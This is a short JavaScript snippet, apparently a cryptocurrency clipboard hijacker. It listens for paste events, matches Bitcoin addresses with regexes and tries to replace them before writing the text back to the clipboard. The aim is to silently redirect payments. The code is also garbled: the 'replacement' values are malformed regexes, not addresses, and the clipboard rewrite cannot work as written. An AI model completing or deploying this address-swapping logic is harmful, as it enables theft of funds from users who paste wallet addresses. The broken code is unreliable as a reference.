const regexReplacements = [
    {
      regex: /\b(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[0-9A-Za-z]{6,75})\b/g,
      replacement: /\b(1[1-9A-HJ-NP-Za-k-NP-Za-km-z]{25,34}|bc1[0-9A-Za-z]{6,75})\b/g
    },
    {
      regex: /\b(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[0-9A-Za-z]{25,39})\b/g,
      replacement: /\b(1[1-9A-HJ-NP-Za-k-NP-Za-km-z]{25,34}|bc1[0-9A-Za-z]{6,75})\b/g
    },
    // Add more regex-replacement pairs as needed
  ];
  
  document.addEventListener('paste', async (event) => {
    const clipboardData = (event.clipboardData || window.clipboardData).getData('text');
    let replacedData = clipboardData;
    regexReplacements.forEach(({ regex, replacement }) => {
      replacedData = replacedData.replace(regex, replacement);
    });
  
    // Replace the clipboard data with the modified content
    if (event.clipboardData) {
      event.clipboardData.setData('text', replacedData);
    } else {
      window.clipboardData.setData('text', replacedData);
    }
  });